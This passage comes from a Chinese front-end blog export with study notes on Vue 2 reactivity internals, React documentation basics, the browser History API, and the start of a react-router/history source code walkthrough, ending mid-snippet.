    <title>vue.js源码解读</title>
    <url>/2020/06/07/vue-js%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB/</url>
    <content><![CDATA[<p>vue.js 源码解读</p>
<a id="more"></a>
<h1 id="双向绑定之-Object"><a href="#双向绑定之-Object" class="headerlink" title="双向绑定之 Object"></a>双向绑定之 Object</h1><p><a href="https://github.com/mfaying/simple-vue/tree/master/src/01" target="_blank" rel="noopener">完整代码</a> (<a href="https://github.com/mfaying/simple-vue/tree/master/src/01" target="_blank" rel="noopener">https://github.com/mfaying/simple-vue/tree/master/src/01</a>)</p>
<p>双向绑定对于 vue.js 来说非常重要，也是该框架的特色之一。那么该如何实现数据的双向绑定呢？本文将基于 vue.js 2.x 版本讲解双向绑定的原理。Object 和 Array 的实现原理有所不同，本文讲解 Object 双向绑定的原理。</p>
<p>要实现双向绑定，必须能监听到数据的取值和赋值，幸运的是 javascript 原生提供了 Object.defineProperty 可以实现监听。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Object</span>.defineProperty(data, key, &#123;</span><br><span class="line">  enumerable: <span class="literal">true</span>,</span><br><span class="line">  configurable: <span class="literal">true</span>,</span><br><span class="line">  <span class="keyword">get</span>: function() &#123;</span><br><span class="line">    dep.depend();</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="keyword">set</span>: function(newVal) &#123;</span><br><span class="line">    <span class="keyword">if</span> (val === newVal) &#123;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    val = newVal;</span><br><span class="line">    dep.notify();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>我们在 get 中收集依赖，在 set 中触发依赖。依赖收集在 dep 中，它的定义如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">Dep</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>() &#123;</span><br><span class="line">    <span class="keyword">this</span>.subs = [];</span><br><span class="line">  &#125;</span><br><span class="line">  addSub(sub) &#123;</span><br><span class="line">    <span class="keyword">this</span>.subs.push(sub);</span><br><span class="line">  &#125;</span><br><span class="line">  removeSub(sub) &#123;</span><br><span class="line">    remove(<span class="keyword">this</span>.subs, sub);</span><br><span class="line">  &#125;</span><br><span class="line">  depend() &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">window</span>.target) &#123;</span><br><span class="line">      <span class="keyword">this</span>.addSub(<span class="built_in">window</span>.target);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  notify() &#123;</span><br><span class="line">    <span class="keyword">const</span> subs = <span class="keyword">this</span>.subs.slice();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>, l = subs.length; i &lt; l; i++) &#123;</span><br><span class="line">      subs[i].update();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">remove</span>(<span class="params">arr, item</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (arr.length) &#123;</span><br><span class="line">    <span class="keyword">const</span> index = arr.indexOf(item);</span><br><span class="line">    <span class="keyword">if</span> (index &gt; <span class="number">-1</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> arr.splice(index, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Dep 将依赖管理的逻辑解耦出来了。它的原理也很简单，基于数组来管理依赖。</p>
<p>那么依赖被通知了，它会执行什么呢？答案是 watcher。watcher 可以理解为任意数据改变需要触发操作的东西，如视图更新。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; parsePath &#125; <span class="keyword">from</span> <span class="string">"./util"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">Watcher</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(vm, expOrFn, cb) &#123;</span><br><span class="line">    <span class="keyword">this</span>.vm = vm;</span><br><span class="line">    <span class="keyword">this</span>.getter = parsePath(expOrFn);</span><br><span class="line">    <span class="keyword">this</span>.cb = cb;</span><br><span class="line">    <span class="keyword">this</span>.value = <span class="keyword">this</span>.get();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">get</span>() &#123;</span><br><span class="line">    <span class="built_in">window</span>.target = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">let</span> value = <span class="keyword">this</span>.getter.call(<span class="keyword">this</span>.vm, <span class="keyword">this</span>.vm);</span><br><span class="line">    <span class="built_in">window</span>.target = <span class="literal">undefined</span>;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">  &#125;</span><br><span class="line">  update() &#123;</span><br><span class="line">    <span class="keyword">const</span> oldValue = <span class="keyword">this</span>.value;</span><br><span class="line">    <span class="keyword">this</span>.value = <span class="keyword">this</span>.get();</span><br><span class="line">    <span class="keyword">this</span>.cb.call(<span class="keyword">this</span>.vm, <span class="keyword">this</span>.value, oldValue);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Watcher 和 Dep 通过一个共同变量 window.target，可以实现依赖的自动收集。</p>
<p>最后，我们需要一个 Observer 类，它可以将一个普通对象完全转换为响应式数据。无论 key 在对象的什么位置，因为它在实现上使用了递归。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Observer</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(value) &#123;</span><br><span class="line">    <span class="keyword">this</span>.value = value;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">Array</span>.isArray(value)) &#123;</span><br><span class="line">      <span class="keyword">this</span>.walk(value);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  walk(obj) &#123;</span><br><span class="line">    <span class="keyword">const</span> keys = <span class="built_in">Object</span>.keys(obj);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; keys.length; i++) &#123;</span><br><span class="line">      defineReactive(obj, keys[i], obj[keys[i]]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">defineReactive</span>(<span class="params">data, key, val</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> val === <span class="string">"object"</span>) &#123;</span><br><span class="line">    <span class="keyword">new</span> Observer(val);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> dep = <span class="keyword">new</span> Dep();</span><br><span class="line">  <span class="built_in">Object</span>.defineProperty(data, key, &#123;</span><br><span class="line">    enumerable: <span class="literal">true</span>,</span><br><span class="line">    configurable: <span class="literal">true</span>,</span><br><span class="line">    <span class="keyword">get</span>: function() &#123;</span><br><span class="line">      dep.depend();</span><br><span class="line">      <span class="keyword">return</span> val;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="keyword">set</span>: function(newVal) &#123;</span><br><span class="line">      <span class="keyword">if</span> (val === newVal) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      val = newVal;</span><br><span class="line">      dep.notify();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后让我们来验证一下</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Observer <span class="keyword">from</span> <span class="string">"./Observer"</span>;</span><br><span class="line"><span class="keyword">import</span> Watcher <span class="keyword">from</span> <span class="string">"./Watcher"</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.data = &#123;</span><br><span class="line">  a: &#123;</span><br><span class="line">    b: &#123;</span><br><span class="line">      c: <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">new</span> Observer(<span class="built_in">window</span>.data);</span><br><span class="line"><span class="keyword">new</span> Watcher(<span class="built_in">window</span>.data, <span class="string">"a.b"</span>, () =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"watcher"</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 执行后打印watcher</span></span><br><span class="line"><span class="built_in">window</span>.data.a.b = <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>《深入浅出 Vue.js》</p>
<p><a href="https://github.com/mfaying/simple-vue/tree/master/src/01" target="_blank" rel="noopener">完整代码</a> (<a href="https://github.com/mfaying/simple-vue/tree/master/src/01" target="_blank" rel="noopener">https://github.com/mfaying/simple-vue/tree/master/src/01</a>)</p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>vue.js</tag>
      </tags>
  </entry>
  <entry>
    <title>d3.js文档</title>
    <url>/2020/07/02/d3-js%E6%96%87%E6%A1%A3/</url>
    <content><![CDATA[<p>d3.js<br><a id="more"></a></p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>d3.js</tag>
      </tags>
  </entry>
  <entry>
    <title>react官方文档</title>
    <url>/2020/07/24/react%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3/</url>
    <content><![CDATA[<p>react官方文档<br><a id="more"></a></p>
<h1 id="JSX简介"><a href="#JSX简介" class="headerlink" title="JSX简介"></a>JSX简介</h1><p>JSX 防止注入攻击</p>
<p>Babel 会把 JSX 转译成一个名为 React.createElement() 函数调用。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> element = (</span><br><span class="line">  &lt;h1 className=<span class="string">"greeting"</span>&gt;</span><br><span class="line">    Hello, world!</span><br><span class="line">  &lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">);</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> element = React.createElement(</span><br><span class="line">  <span class="string">'h1'</span>,</span><br><span class="line">  &#123;<span class="attr">className</span>: <span class="string">'greeting'</span>&#125;,</span><br><span class="line">  <span class="string">'Hello, world!'</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>React.createElement()会预先执行一些检查，以帮助你编写无错代码，但实际上它创建了一个这样的对象：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 注意：这是简化过的结构</span></span><br><span class="line"><span class="keyword">const</span> element = &#123;</span><br><span class="line">  type: <span class="string">'h1'</span>,</span><br><span class="line">  props: &#123;</span><br><span class="line">    className: <span class="string">'greeting'</span>,</span><br><span class="line">    children: <span class="string">'Hello, world!'</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<h1 id="元素渲染"><a href="#元素渲染" class="headerlink" title="元素渲染"></a>元素渲染</h1><p>元素是构成 React 应用的最小砖块。</p>
<p>元素描述了你在屏幕上想看到的内容。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> element = <span class="xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, world<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>;</span><br></pre></td></tr></table></figure>
<p>与浏览器的 DOM 元素不同，React 元素是创建开销极小的普通对象。React DOM 会负责更新 DOM 来与 React 元素保持一致。</p>
<p>假设你的 HTML 文件某处有一个<code>&lt;div&gt;</code><br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;div id=<span class="string">"root"</span>&gt;&lt;<span class="regexp">/div&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>我们将其称为“根” DOM 节点，因为该节点内的所有内容都将由 React DOM 管理。</p>
<p>想要将一个 React 元素渲染到根 DOM 节点中，只需把它们一起传入 ReactDOM.render()：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> element = <span class="xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, world<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>;</span><br><span class="line">ReactDOM.render(element, <span class="built_in">document</span>.getElementById(<span class="string">'root'</span>));</span><br></pre></td></tr></table></figure></p>
<p>React 元素是不可变对象。一旦被创建，你就无法更改它的子元素或者属性。一个元素就像电影的单帧：它代表了某个特定时刻的 UI。</p>
<p>根据我们已有的知识，更新 UI 唯一的方式是创建一个全新的元素，并将其传入 ReactDOM.render()。</p>
<p>在实践中，大多数 React 应用只会调用一次 ReactDOM.render()。在下一个章节，我们将学习如何将这些代码封装到有状态组件中。</p>
<p>React 只更新它需要更新的部分<br>React DOM 会将元素和它的子元素与它们之前的状态进行比较，并只会进行必要的更新来使 DOM 达到预期的状态。</p>
<h1 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h1><p>Props 的只读性</p>
<p>所有 React 组件都必须像纯函数一样保护它们的 props 不被更改。</p>
<h1 id="State-amp-生命周期"><a href="#State-amp-生命周期" class="headerlink" title="State &amp; 生命周期"></a>State &amp; 生命周期</h1><p>出于性能考虑，React 可能会把多个 setState() 调用合并成一个调用。</p>
<p>例如，此代码可能会无法更新计数器：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Wrong</span></span><br><span class="line"><span class="keyword">this</span>.setState(&#123;</span><br><span class="line">  counter: <span class="keyword">this</span>.state.counter + <span class="keyword">this</span>.props.increment,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>要解决这个问题，可以让 setState() 接收一个函数而不是一个对象。这个函数用上一个 state 作为第一个参数，将此次更新被应用时的 props 做为第二个参数：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Correct</span></span><br><span class="line"><span class="keyword">this</span>.setState(<span class="function">(<span class="params">state, props</span>) =&gt;</span> (&#123;</span><br><span class="line">  counter: state.counter + props.increment</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure></p>
<p>上面使用了箭头函数，不过使用普通的函数也同样可以：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Correct</span></span><br><span class="line"><span class="keyword">this</span>.setState(<span class="function"><span class="keyword">function</span>(<span class="params">state, props</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    counter: state.counter + props.increment</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>State 的更新会被合并</p>
<p>当你调用 setState() 的时候，React 会把你提供的对象合并到当前的 state。</p>
<p>例如，你的 state 包含几个独立的变量：</p>
<p>这里的合并是浅合并，所以 this.setState({comments}) 完整保留了 this.state.posts， 但是完全替换了 this.state.comments。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">constructor</span>(props) &#123;</span><br><span class="line">  <span class="keyword">super</span>(props);</span><br><span class="line">  <span class="keyword">this</span>.state = &#123;</span><br><span class="line">    posts: [],</span><br><span class="line">    comments: []</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">this</span>.setState(&#123;</span><br><span class="line">  comments: response.comments</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<h1 id="事件处理"><a href="#事件处理" class="headerlink" title="事件处理"></a>事件处理</h1><h1 id="条件渲染"><a href="#条件渲染" class="headerlink" title="条件渲染"></a>条件渲染</h1><h1 id="状态提升"><a href="#状态提升" class="headerlink" title="状态提升"></a>状态提升</h1><h1 id="组合-vs-继承"><a href="#组合-vs-继承" class="headerlink" title="组合 vs 继承"></a>组合 vs 继承</h1><h1 id="React哲学"><a href="#React哲学" class="headerlink" title="React哲学"></a>React哲学</h1><p>通过问自己以下三个问题，你可以逐个检查相应数据是否属于 state：</p>
<p>该数据是否是由父组件通过 props 传递而来的？如果是，那它应该不是 state。<br>该数据是否随时间的推移而保持不变？如果是，那它应该也不是 state。<br>你能否根据其他 state 或 props 计算出该数据的值？如果是，那它也不是 state。</p>
<h1 id="无障碍辅助功能"><a href="#无障碍辅助功能" class="headerlink" title="无障碍辅助功能"></a>无障碍辅助功能</h1><h1 id="代码分割"><a href="#代码分割" class="headerlink" title="代码分割"></a>代码分割</h1><p>import</p>
<p>React.lazy</p>
<p>context</p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>react</tag>
      </tags>
  </entry>
  <entry>
    <title>浏览器History对象</title>
    <url>/2020/08/25/%E6%B5%8F%E8%A7%88%E5%99%A8History%E5%AF%B9%E8%B1%A1/</url>
    <content><![CDATA[<p>浏览器History对象<br><a id="more"></a></p>
<p>History对象包含用户（在浏览器窗口中）访问过的URL。可通过window.history属性对其进行访问。</p>
<h2 id="History对象属性"><a href="#History对象属性" class="headerlink" title="History对象属性"></a>History对象属性</h2><h3 id="length"><a href="#length" class="headerlink" title="length"></a>length</h3><p>声明了浏览器历史列表中的元素数量。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">history.length()</span><br></pre></td></tr></table></figure>
<h2 id="History对象方法"><a href="#History对象方法" class="headerlink" title="History对象方法"></a>History对象方法</h2><h3 id="back"><a href="#back" class="headerlink" title="back()"></a>back()</h3><p>加载历史列表中的前一个URL（如果存在），等价于点击后退按钮或调用history.go(-1)。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">history.back()</span><br></pre></td></tr></table></figure>
<h3 id="forward"><a href="#forward" class="headerlink" title="forward()"></a>forward()</h3><p>加载历史列表中的下一个URL，等价于点击前进按钮或调用history.go(1)。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">history.forward()</span><br></pre></td></tr></table></figure>
<h3 id="go"><a href="#go" class="headerlink" title="go()"></a>go()</h3><p>加载历史列表中的某个具体的页面。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">history.go(number|URL)</span><br></pre></td></tr></table></figure>
<h3 id="pushState"><a href="#pushState" class="headerlink" title="pushState()"></a>pushState()</h3><p>可以改变网址(存在跨域限制)而不刷新页面</p>
<p>注意:仅改变网址,网页不会真的跳转,也不会获取到新的内容,本质上网页还停留在原页面!<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">history.pushState(data, title, targetURL);</span><br><span class="line"></span><br><span class="line"><span class="comment">// @状态对象：传给目标路由的信息,可为空</span></span><br><span class="line"><span class="comment">// @页面标题：目前所有浏览器都不支持,填空字符串即可</span></span><br><span class="line"><span class="comment">// @可选url：目标url，不会检查url是否存在，且不能跨域。如不传该项,即给当前url添加data</span></span><br></pre></td></tr></table></figure></p>
<h3 id="replaceState"><a href="#replaceState" class="headerlink" title="replaceState()"></a>replaceState()</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.history.replaceState(data, title, targetURL);</span><br><span class="line"></span><br><span class="line"><span class="comment">// @类似于pushState,但是会直接替换掉当前url,而不会在history中留下记录</span></span><br></pre></td></tr></table></figure>
<h2 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h2><h3 id="popstate事件"><a href="#popstate事件" class="headerlink" title="popstate事件"></a>popstate事件</h3><p>popstate事件会在点击后退、前进按钮(或调用history.back()、history.forward()、history.go()方法)时触发。前提是不能真的发生了页面跳转,而是在由history.pushState()或者history.replaceState()形成的历史节点中前进后。</p>
<p>注意:用history.pushState()或者history.replaceState()不会触发popstate事件。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.onpopstate = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(event.state);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">window</span>.history.state;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>以上两种方式皆可获取之前在pushState和replaceState中传入的data</p>
<p>## </p>
]]></content>
  </entry>
  <entry>
    <title>react-router源码完全解读</title>
    <url>/2020/08/25/react-router%E6%BA%90%E7%A0%81%E5%AE%8C%E5%85%A8%E8%A7%A3%E8%AF%BB/</url>
    <content><![CDATA[<p>react-router源码完全解读</p>
<a id="more"></a>
<p>注：react-router版本为v5.2.0</p>
<h1 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h1><p>1.前端基础：history、location。</p>
<p>2.react: refs转发、context、useContext(react Hooks)。</p>
<p>3.依赖库：</p>
<p>history（^4.9.0）</p>
<p>path-to-regexp（^1.7.0）：主要用到pathToRegexp.compile(path)、pathToRegexp(path, keys, options)两个方法</p>
<h1 id="history库（-4-9-0）"><a href="#history库（-4-9-0）" class="headerlink" title="history库（^4.9.0）"></a>history库（^4.9.0）</h1><p>history库是react-router依赖的核心库，它将应用的history做了统一的抽象，包含一系列统一的属性和方法，支持浏览器的BrowserHistory、HashHistory以及服务端的MemoryHistory。</p>
<p>createBrowserHistory的属性和方法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">length: globalHistory.length,</span><br><span class="line">action: <span class="string">'POP'</span>,</span><br><span class="line">location: initialLocation,</span><br><span class="line">createHref,</span><br><span class="line">push,</span><br><span class="line">replace,</span><br><span class="line">go,</span><br><span class="line">goBack,</span><br><span class="line">goForward,</span><br><span class="line">block,</span><br><span class="line">listen</span><br></pre></td></tr></table></figure>
<p>createHashHistory的属性和方法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">length: globalHistory.length,</span><br><span class="line">action: <span class="string">'POP'</span>,</span><br><span class="line">location: initialLocation,</span><br><span class="line">createHref,</span><br><span class="line">push,</span><br><span class="line">replace,</span><br><span class="line">go,</span><br><span class="line">goBack,</span><br><span class="line">goForward,</span><br><span class="line">block,</span><br><span class="line">listen</span><br></pre></td></tr></table></figure>
<p>createMemoryHistory的属性和方法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">length: entries.length,</span><br><span class="line">action: <span class="string">'POP'</span>,</span><br><span class="line">location: entries[index],</span><br><span class="line">index,</span><br><span class="line">entries,</span><br><span class="line">createHref,</span><br><span class="line">push,</span><br><span class="line">replace,</span><br><span class="line">go,</span><br><span class="line">goBack,</span><br><span class="line">goForward,</span><br><span class="line">canGo,</span><br><span class="line">block,</span><br><span class="line">listen</span><br></pre></td></tr></table></figure>
<p>接下来我们讲解一下这三种history的具体实现。</p>
<h2 id="createTransitionManager"><a href="#createTransitionManager" class="headerlink" title="createTransitionManager"></a>createTransitionManager</h2><p>createTransitionManager可以创建一个TransitionManager来帮助history管理各种行为，它被三种history都使用了，我们先来介绍它。</p>
<p>这是createTransitionManager的主要功能代码，很容易理解，就是实现了一个发布订阅模式。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> listeners = [];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">appendListener</span>(<span class="params">fn</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> isActive = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">listener</span>(<span class="params">...args</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (isActive) fn(...args);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  listeners.push(listener);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    isActive = <span class="literal">false</span>;</span><br><span class="line">    listeners = listeners.filter(<span class="function"><span class="params">item</span> =&gt;</span> item !== listener);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">notifyListeners</span>(<span class="params">...args</span>) </span>&#123;</span><br><span class="line">  listeners.forEach(<span class="function"><span class="params">listener</span> =&gt;</span> listener(...args));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>setPrompt()是显示可提示用户进行输入的对话框的意思，这个功能主要是为了一些典型场景，比如：用户点击手机的返回键，让用户确认是否返回上一个url。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> prompt = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setPrompt</span>(<span class="params">nextPrompt</span>) </span>&#123;</span><br><span class="line">  warning(prompt == <span class="literal">null</span>, <span class="string">'A history supports only one prompt at a time'</span>);</span><br><span class="line"></span><br><span class="line">  prompt = nextPrompt;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (prompt === nextPrompt) prompt = <span class="literal">null</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>confirmTransitionTo在history的行为方法中（push、pop、replace）都会被调用，它的作用是拦截每个行为，让用户或开发者确认能否执行这个行为。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">confirmTransitionTo</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">  location,</span></span></span><br><span class="line"><span class="function"><span class="params">  action,</span></span></span><br><span class="line"><span class="function"><span class="params">  getUserConfirmation,</span></span></span><br><span class="line"><span class="function"><span class="params">  callback</span></span></span><br><span class="line"><span class="function"><span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// <span class="doctag">TODO:</span> If another transition starts while we're still confirming</span></span><br><span class="line">  <span class="comment">// the previous one, we may end up in a weird state. Figure out the</span></span><br><span class="line">  <span class="comment">// best way to handle this.</span></span><br><span class="line">  <span class="keyword">if</span> (prompt != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> result =</span><br><span class="line">      <span class="keyword">typeof</span> prompt === <span class="string">'function'</span> ? prompt(location, action) : prompt;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> result === <span class="string">'string'</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">typeof</span> getUserConfirmation === <span class="string">'function'</span>) &#123;</span><br><span class="line">        getUserConfirmation(result, callback);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        warning(</span><br><span class="line">          <span class="literal">false</span>,</span><br><span class="line">          <span class="string">'A history needs a getUserConfirmation function in order to use a prompt message'</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        callback(<span class="literal">true</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// Return false from a transition hook to cancel the transition.</span></span><br><span class="line">      callback(result !== <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    callback(<span class="literal">true</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>例如，push方法中confirmTransitionTo是这样使用的，在第四个参数callback中根据返回值是否为true,判断是否真正执行push行为。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">push</span>(<span class="params">path, state</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> action = <span class="string">'PUSH'</span>;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  </span><br><span class="line">  transitionManager.confirmTransitionTo(</span><br><span class="line">    location,</span><br><span class="line">    action,</span><br><span class="line">    getUserConfirmation,</span><br><span class="line">    ok =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (!ok) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="history-listen"><a href="#history-listen" class="headerlink" title="history.listen"></a>history.listen</h2><p>history.listen在浏览器中主要是利用DOM方法进行事件监听的绑定和取消。</p>
<h3 id="browserHistory中的实现"><a href="#browserHistory中的实现" class="headerlink" title="browserHistory中的实现"></a>browserHistory中的实现</h3><p>browserHistory使用的是popstate和hashchange事件。</p>
<p>同时会将监听触发的回调函数添加到前面介绍的transitionManager中，这样监听触发时只需要通过执行transitionManager.notifyListeners()发送通知，执行这些回调函数就可以了。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> PopStateEvent = <span class="string">'popstate'</span>;</span><br><span class="line"><span class="keyword">const</span> HashChangeEvent = <span class="string">'hashchange'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> listenerCount = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkDOMListeners</span>(<span class="params">delta</span>) </span>&#123;</span><br><span class="line">  listenerCount += delta;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (listenerCount === <span class="number">1</span> &amp;&amp; delta === <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">window</span>.addEventListener(PopStateEvent, handlePopState);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> 